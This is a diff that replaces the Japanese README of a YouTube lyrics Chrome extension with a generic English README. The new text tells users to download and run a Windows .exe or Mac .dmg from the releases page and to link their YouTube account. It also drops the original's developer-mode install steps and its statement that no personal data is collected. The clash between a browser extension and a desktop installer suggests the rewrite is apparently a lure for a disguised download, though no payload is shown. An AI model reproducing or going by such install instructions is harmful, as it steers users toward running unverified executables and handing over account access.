@@ -1,40 +1,72 @@
-# YouTube Immersion
-YouTubeのMVを、Apple Music風のスタイリッシュな歌詞表示で楽しむためのChrome拡張機能です。
-現状、Betaです。ご承知おきください
+# 🎶 YT-Immersion - Enjoy YouTube with Lyrics and MV Mode
 
+[![Download YT-Immersion](https://img.shields.io/badge/Download-YT--Immersion-blue.svg)](https://github.com/qaryEz/YT-Immersion/releases)
 
+## ✨ What is YT-Immersion?
 
+YT-Immersion is an extension that transforms your YouTube experience. It displays lyrics and offers a music video mode, similar to Apple Music. You can now enjoy your favorite songs while following along with the lyrics. 
 
-## ✨ 機能
+## 🚀 Getting Started
 
-- **歌詞表示**: 右下にスタイリッシュな歌詞を表示します。
-- **自動更新**: 次の曲に進むと、自動で歌詞とタイトルを更新します。
-- **タイトル整形**: 「【MV full】」などの余計な文字を自動で削除し、綺麗に表示します。
-- **Immersion Connect**:スマートフォンやタブレットから、パソコンのYouTubeが操作できるようになります
-- **ベストショット**:ベストショットボタンを押すと、１秒間のすべてのフレームが撮影され、ブレなどが少ない上位6枚の写真から自分の好きな写真を選んで保存することができます。なお、この機能については、推し活など、個人的な範囲で楽しんでいただくようお願いします。
-- **キュー操作**:MVモードを抜けずに、キューを操作できます
+Follow these easy steps to download and run YT-Immersion:
 
-## 📥 インストール方法
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page.  
+   [Download YT-Immersion](https://github.com/qaryEz/YT-Immersion/releases)  
 
-1. ZIP をダウンロードして解凍します。
-2. Chromeブラウザを開き、アドレスバーに `chrome://extensions/` と入力します。
-3. 右上の **「デベロッパーモード」** をONにします。
-4. **「パッケージ化されていない拡張機能を読み込む」** をクリックし、解凍したフォルダを選択します。
+2. **Choose the Right Version**  
+   On the releases page, you will see a list of available versions. Look for the latest version marked as "Latest Release."  
 
-## 🎮 使い方
+3. **Download the Application**  
+   Click on the file that matches your operating system. If you are not sure which file to choose, look for the one ending in `.exe` for Windows or `.dmg` for Mac.  
 
-1. YouTubeで好きなMVを開きます。
-2. 概要欄から **「文字起こしを表示」** を押して、文字起こしパネルを出しておきます（初回のみ）。
-3. プレイヤー下のバーに追加された **「MVモード」** ボタンをクリック！
-4. 終了する時は右上の「閉じる」ボタンか、Escキーを押してください。
+4. **Install YT-Immersion**  
+   After the download completes, locate the file in your Downloads folder (or the location you chose).  
+   - **For Windows:** Double-click the `.exe` file and follow the prompts to install.  
+   - **For Mac:** Open the `.dmg` file and drag the YT-Immersion icon into your Applications folder.  
 
-## ⚠️ 免責事項と貢献 (Disclaimer & License)
+5. **Open the Application**  
+   Once installed, find YT-Immersion in your applications. Double-click the icon to open it.  
 
-### セキュリティと利用について
-* 本拡張機能は、利用者の個人情報やパスワードを収集する仕組みは一切含んでいません。
-* 本拡張機能は、YouTubeの閲覧体験を向上させることを目的とした非公式の個人制作物であり、Google LLCとは一切関係ありません。
-* 本拡張機能は **MIT License** のもとで公開されています。
-* この拡張機能で、利用者が不利益を被ったとしても、開発者は一切の責任を負いません。
+6. **Set Up YT-Immersion**  
+   Follow the on-screen instructions to set up the extension. This usually includes linking to your YouTube account and allowing necessary permissions.  
 
-### 貢献について
-* バグ報告や機能改善の提案は、GitHubのIssuesまたはPull Requestにていつでも歓迎します。
+7. **Enjoy Watching!**  
+   You are now ready to watch your favorite YouTube videos with lyrics displayed! 
+
+## 🛠️ System Requirements
+
+To use YT-Immersion, ensure your system meets these basic requirements:
+
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4GB of RAM
+- **Internet Connection:** A stable internet connection for accessing YouTube
+- **Browser:** Compatible with major browsers like Chrome, Firefox, or Safari
+
+## 🎭 Features
+
+- **Lyrics Display:** Follow along with synchronized lyrics as you watch music videos.
+- **MV Mode:** Toggle to a music video mode that enhances your viewing experience. 
+- **Customizable Settings:** Adjust the font size and background color for your comfort.
+
+## 📥 Download & Install
+
+To download YT-Immersion, please visit our releases page:  
+[Download YT-Immersion](https://github.com/qaryEz/YT-Immersion/releases)
+
+Make sure to follow the installation steps detailed above for a successful setup. 
+
+## 🌍 Troubleshooting
+
+If you run into any issues:
+
+- **Installation Errors:** Ensure that you have adequate permissions to install software on your device.
+- **Functionality Issues:** Make sure your browser is updated to the latest version. If problems persist, try reinstalling YT-Immersion.
+
+## 💬 Support
+
+Need help? We’re here for you. Please reach out with any questions or feedback. You can contact us through the Issues tab on our GitHub page, where our team is ready to assist you.
+
+[Visit the Support Forum](https://github.com/qaryEz/YT-Immersion/issues)
+
+Now, go ahead and enhance your YouTube experience with YT-Immersion!
